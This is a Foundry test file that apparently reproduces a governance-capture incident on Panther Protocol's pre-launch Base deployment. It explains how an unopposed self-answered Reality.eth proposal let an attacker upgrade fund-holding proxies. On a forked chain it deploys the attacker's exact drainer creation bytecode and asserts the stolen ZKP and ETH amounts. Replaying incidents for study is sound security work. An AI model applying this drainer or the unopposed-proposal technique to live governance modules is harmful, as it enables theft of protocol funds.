// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Panther Protocol (ZKP) — governance-timeout capture on the BASE deployment.
//
// IMPORTANT FRAMING: Panther's Base deployment was NOT yet in production at the time of this
// incident. Per the team's own public (Telegram) statement, no live user funds were compromised;
// this was a pre-launch governance-mechanism failure, not a drain of an operating protocol. The
// on-chain value that moved (~5.12M ZKP + ~0.12 ETH) came out of the pre-launch deployment's own
// governance-controlled proxies, and the root cause was a missing safeguard on THIS deployment
// (the Reality.eth module was not disabled while there was no active governance proposal), a
// protection the team indicated was correctly enabled on their other deployments.
//
// Same class as the StrongBlock / CompoundProvider (BarnBridge) PoCs already in this repo:
// governance capture of a proxy-upgrade authority, then abuse of that authority to swap fund-
// holding proxies to a drainer implementation. The twist here is that NO code bug and NO stolen
// key were involved. The path is entirely permissionless: anyone can (1) submit a Reality.eth /
// Zodiac governance proposal, (2) bond a "yes" answer to their own proposal, and (3) execute it
// once finalized. The only thing the attacker exploited was that nobody posted a competing "no"
// bond inside the challenge window, so an unopposed self-answer finalized and executed.
//
// ---- Actors / contracts (all verified on-chain, Base / chainId 8453) ----
// Attacker EOA:            0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6
// Attacker orchestrator:   0x9400161d512C740e1C0C77f3c931D112f068210c  (owner() == attacker EOA)
//                          its initiate() both ASKED the proposal question and self-answered "yes"
//                          with the 0.5 ETH bond, and it is the recipient of the drained funds.
// Zodiac RealityModuleETH: 0x4ce69e77A8806B51f15b8D0FC38A9c1f66A851b4  (EIP-1167 clone of
//                          impl 0x4e35da39fA5893a70A40Ce964F993d891E607cC0)
//   avatar/target/owner == Panther Safe 0xb16283A233D5b010A7b290d593847207495F0284
//   oracle              == Reality.eth  0x2F39f464d16402Ca3D8527dA89617b73DE2F60e8
//   questionTimeout 43200 (12h)  questionCooldown 28800 (8h)  minimumBond 0.5 ETH
//   (the 12h + 8h challenge/cooldown window the report cites — read live from the module)
// Reality.eth v3.0:        0x2F39f464d16402Ca3D8527dA89617b73DE2F60e8
// ZKP token (Base):        0x0a776C1c22b8b8e7EAB346744dAA33722b80FdA4  ("Panther" / ZKP / 18)
//
// ---- On-chain timeline (author-verified) ----
//   block 49587776  ts 1785964899  proposal + self-answer  tx 0xe6a25b20...f45c1d5a
//                   Reality question named "zkp-reexploit" (id 0x185d35ec...3c47c56b),
//                   answer 0x..01 ("yes"), 0.5 ETH bond, asker == the Reality module.
//   [12h timeout with no competing bond, then 8h module cooldown; ~21.2h total]
//   block 49625945  ts 1786041237  execution + drain      tx 0x88fb5398...ac197a01
//                   attacker EOA deploys a one-shot contract whose constructor calls the module's
//                   executeProposalWithIndex 5x (one per ZKP proxy). Each execution makes the Safe
//                   upgradeToAndCall() the proxy to a drainer impl, sweeping its ZKP to the
//                   orchestrator 0x9400161d. Net: 5,124,773.63 ZKP + ~0.1233 ETH to the attacker.
//
// PoC strategy (StrongBlock/BarnBridge style): fork ONE block before the execution (49625944),
// where the governance answer is already finalized on Reality.eth (isFinalized == true,
// resultFor == "yes") so we do NOT replay the vote — we assert it is already settled, exactly as
// it was on-chain. Then, as the attacker EOA, replay the drain by deploying the attacker's exact
// on-chain creation calldata (hardcoded below as DRAIN_CREATION). Assert the orchestrator's ZKP
// and ETH balances rise by the full reported amounts. No signer key, no admin role, no code bug
// is used anywhere in this replay — only the finalized, unopposed governance answer.
//
// Run: forge test --contracts ./src/test/2026-08/PantherBase_exp.sol -vvv
// Requires a Base RPC (foundry.toml alias: base).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function symbol() external view returns (string memory);
}

interface IRealityETH {
    function isFinalized(bytes32 question_id) external view returns (bool);
    function resultFor(bytes32 question_id) external view returns (bytes32);
}

interface IRealityModule {
    function oracle() external view returns (address);
    function avatar() external view returns (address);
    function questionTimeout() external view returns (uint32);
    function questionCooldown() external view returns (uint32);
    function minimumBond() external view returns (uint256);
}

contract PantherBaseExp is Test {
    address constant ATTACKER = 0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6;
    address constant ORCHESTRATOR = 0x9400161d512C740e1C0C77f3c931D112f068210c; // receives drained funds
    address constant MODULE = 0x4ce69e77A8806B51f15b8D0FC38A9c1f66A851b4; // Zodiac RealityModuleETH clone
    address constant SAFE = 0xb16283A233D5b010A7b290d593847207495F0284; // avatar/owner (proxy upgrade authority)
    IRealityETH constant REALITY = IRealityETH(0x2F39f464d16402Ca3D8527dA89617b73DE2F60e8);
    IERC20 constant ZKP = IERC20(0x0a776C1c22b8b8e7EAB346744dAA33722b80FdA4);

    bytes32 constant QUESTION_ID = 0x185d35eccec0fb7578a8e989764803963d6bb6098757d802b30348233c47c56b;

    uint256 constant FORK_BLOCK = 49625944; // one block before the attacker's execution/drain tx
    uint256 constant EXEC_TS = 1786041237; // timestamp of the real execution block (49625945)

    // Reported / measured loss: 5,124,773.626 ZKP + ~0.1233 ETH.
    uint256 constant ZKP_DRAINED = 5_124_773_626006184526790998;
    uint256 constant ETH_DRAINED = 123_291500437368375;

    // Exact on-chain creation calldata of the attacker's execution tx 0x88fb5398...ac197a01.
    // Its constructor calls MODULE.executeProposalWithIndex 5x (upgrading each ZKP proxy through
    // the Safe to a drainer impl) and sweeps the ZKP + ETH to ORCHESTRATOR 0x9400161d.
    bytes constant DRAIN_CREATION =
        hex"346105c45760c06040819052600d6080526c1e9adc0b5c99595e1c1b1bda5d609a1b60a05261002d81610725565b6005815260a0803660208401377f"
        hex"7a798695490105bde6288ef3ad72f6234d150e0dc0d9843d5e9597aea464e4276100648361077f565b527f6870475ede8f53250cdc3985a335781058"
        hex"f411dab5560e4389f04222a388ba8761008f836107a0565b527f3f491c2846e99862a3419e7adf6d196e4af3e2af373f5aa6a6eb50ea4ca8c1cd6100"
        hex"ba836107b0565b527f04e269a7553741e9347beb99c97e33c311fdf9f4acb6b8c47d3d0611199d856f6100e5836107c0565b527f30078160cfdd0efe"
        hex"54aae3a7ac4957fe0b7a37093808062956da0089e05ca536610110836107d0565b526040519161011e83610725565b600583528136602085013773ee"
        hex"a28cf0837306041fa53187f0802ac95228cd456101478461077f565b527370c69bb8501b30cf112403139a383bf978f4a31e610166846107a0565b52"
        hex"73c582a112ea36e88c549d7a22b7e2548d5a1d884f610185846107b0565b52739a7447fc9aae30f0cde301e34f813155f071b8466101a4846107c056"
        hex"5b527384166c4007a7cf32165c90c6c783d3de9db1d6eb6101c3846107d0565b52604051916101d183610725565b600583525f5b8181106107145750"
        hex"604051608081016001600160401b0381118282101761058957604052604481527fa978bc430000000000000000000000009400161d512c740e1c0c77"
        hex"f3c931d11260208201527ff068210c000000000000000000000000000000000000000000032d56fa356d196040820152610f2160f31b606082015261"
        hex"025f8461077f565b526102698361077f565b505f60405161027781610740565b60e481527f4f1ef28600000000000000000000000093f8db7441e514"
        hex"f6609f7ac9b967c16a928360208301526302a7b94760e61b90816040840152600160e61b8060608501527c6477c202e6000000000000000000000000"
        hex"0a776c1c22b8b8e7eab34674908160808601527f4daa33722b80fda40000000000000000000000009400161d512c740e1c0c77f39384848701527fc9"
        hex"31d112f068210c0000000000000000000000005335839b374e6b2c8b9f0b4960c0870152670c39fab8c64b385b60c21b60e087015261010095878782"
        hex"01526103528b6107a0565b5261035c8a6107a0565b506040519761036a89610740565b60e48952602089015260408801526060870152608086015284"
        hex"015267324c7444bc1a084360c21b60c084015260e083018290528201526103a9836107b0565b526103b3826107b0565b506103bc610832565b6103c5"
        hex"836107c0565b526103cf826107c0565b506103d8610832565b6103e1836107d0565b526103eb826107d0565b506040516370a0823160e01b815273ee"
        hex"a28cf0837306041fa53187f0802ac95228cd456004820152602081602481730a776c1c22b8b8e7eab346744daa33722b80fda45afa90811561059d57"
        hex"5f916106e2575b506a032d56fa356d1979080000908181106105c8575b50505f5b6005811061046e57604051603990816108f58239f35b6001600160"
        hex"a01b0361048082866107e0565b511661048c82856107e0565b5190734ce69e77a8806b51f15b8d0fc38a9c1f66a851b43b156105c457604051630518"
        hex"12e360e21b815260e06004820152919082906104cf60e4830160806107f4565b90600319908184840301602485015260208851938481520192602089"
        hex"01905f905b8082106105a857505050915f9461051c92859460448601528660648601528483030160848501526107f4565b8360a48301528560c48301"
        hex"52038183734ce69e77a8806b51f15b8d0fc38a9c1f66a851b45af1801561059d57610572575b505f19811461055e57600101610458565b634e487b71"
        hex"60e01b5f52601160045260245ffd5b6001600160401b038111610589576040525f61054d565b634e487b7160e01b5f52604160045260245ffd5b6040"
        hex"513d5f823e3d90fd5b82518652889650602095860195909201916001909101906104f0565b5f80fd5b818181031161055e576040516370a0823160e0"
        hex"1b8152306004820152602081602481730a776c1c22b8b8e7eab346744daa33722b80fda45afa90811561059d575f916106ad575b5081830311610454"
        hex"5760405163a9059cbb60e01b815273eea28cf0837306041fa53187f0802ac95228cd456004820152910360248201526020816044815f730a776c1c22"
        hex"b8b8e7eab346744daa33722b80fda45af1801561059d57610675575b80610454565b6020813d6020116106a5575b8161068e6020938361075c565b81"
        hex"0103126105c45751801515036105c4575f61066f565b3d9150610681565b906020823d6020116106da575b816106c76020938361075c565b81010312"
        hex"6106d75750515f61060f565b80fd5b3d91506106ba565b906020823d60201161070c575b816106fc6020938361075c565b810103126106d75750515f"
        hex"61043e565b3d91506106ef565b8060606020809387010152016101d7565b60c081019081106001600160401b0382111761058957604052565b610120"
        hex"81019081106001600160401b0382111761058957604052565b601f909101601f19168101906001600160401b0382119082101761058957604052565b"
        hex"80511561078c5760200190565b634e487b7160e01b5f52603260045260245ffd5b80516001101561078c5760400190565b80516002101561078c5760"
        hex"600190565b80516003101561078c5760800190565b80516004101561078c5760a00190565b805182101561078c5760209160051b010190565b919082"
        hex"51928382525f5b84811061081e575050825f602080949584010152601f8019910116010190565b6020818301810151848301820152016107fe565b60"
        hex"40519061010082016001600160401b0381118382101761058957604090815260c483527f4f1ef28600000000000000000000000093f8db7441e514f6"
        hex"609f7ac9b967c16a60208401526302a7b94760e61b90830152600160e61b60608301527c44f6fedd8c0000000000000000000000005ff137d4b0fdcd"
        hex"49dca30c7c60808301527ff57e578a026d27890000000000000000000000009400161d512c740e1c0c77f360a083015267324c7444bc1a084360c21b"
        hex"60c08301525f60e083015256fe5f80fdfea2646970667358221220f458ce1a27fcfa5887eecfe29b2f9ee7b8b5c77f1477b242286936015a0fb1a064"
        hex"736f6c63430008140033";

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(ORCHESTRATOR, "AttackerOrchestrator");
        vm.label(MODULE, "RealityModule");
        vm.label(SAFE, "PantherSafe");
        vm.label(address(REALITY), "RealityETH");
        vm.label(address(ZKP), "ZKP");
    }

    function testExploit() public {
        // 1) Governance state is already settled on-chain: the attacker's self-answer finalized
        //    UNOPPOSED. We assert it rather than replaying the vote.
        assertTrue(REALITY.isFinalized(QUESTION_ID), "reality answer must already be finalized");
        assertEq(
            REALITY.resultFor(QUESTION_ID),
            bytes32(uint256(1)),
            "finalized answer must be 'yes' (1)"
        );

        // 2) The mechanism the attacker rode is fully public and its parameters are the reported
        //    12h timeout / 8h cooldown / 0.5 ETH bond — read live from the module.
        assertEq(IRealityModule(MODULE).oracle(), address(REALITY), "module oracle");
        assertEq(IRealityModule(MODULE).avatar(), SAFE, "module avatar is the Panther Safe");
        assertEq(IRealityModule(MODULE).questionTimeout(), 43200, "12h challenge timeout");
        assertEq(IRealityModule(MODULE).questionCooldown(), 28800, "8h cooldown");
        assertEq(IRealityModule(MODULE).minimumBond(), 0.5 ether, "0.5 ETH minimum bond");

        uint256 zkpBefore = ZKP.balanceOf(ORCHESTRATOR);
        uint256 ethBefore = ORCHESTRATOR.balance;
        assertEq(zkpBefore, 0, "orchestrator holds no ZKP before the drain");
        emit log_named_string("victim token", ZKP.symbol());
        emit log_named_decimal_uint("orchestrator ZKP before", zkpBefore, 18);

        // Advance to the real execution timestamp so the module's finalize+cooldown gate is met
        // (this only moves time forward past an already-finalized answer; it invents nothing).
        vm.warp(EXEC_TS);

        // 3) Replay the drain: as the attacker EOA, deploy the exact on-chain creation calldata.
        //    executeProposalWithIndex is permissionless — no admin key or signature is used here.
        vm.startPrank(ATTACKER, ATTACKER);
        bytes memory code = DRAIN_CREATION;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        vm.stopPrank();
        require(deployed != address(0), "drain deployment/execution failed");

        uint256 zkpStolen = ZKP.balanceOf(ORCHESTRATOR) - zkpBefore;
        uint256 ethStolen = ORCHESTRATOR.balance - ethBefore;
        emit log_named_decimal_uint("ZKP drained", zkpStolen, 18);
        emit log_named_decimal_uint("ETH drained", ethStolen, 18);

        // ~5.12M ZKP and ~0.12 ETH, matching the reported loss.
        assertApproxEqAbs(zkpStolen, ZKP_DRAINED, 1e18, "ZKP drained off reported ~5.12M");
        assertApproxEqAbs(ethStolen, ETH_DRAINED, 1e15, "ETH drained off reported ~0.12");
    }
}
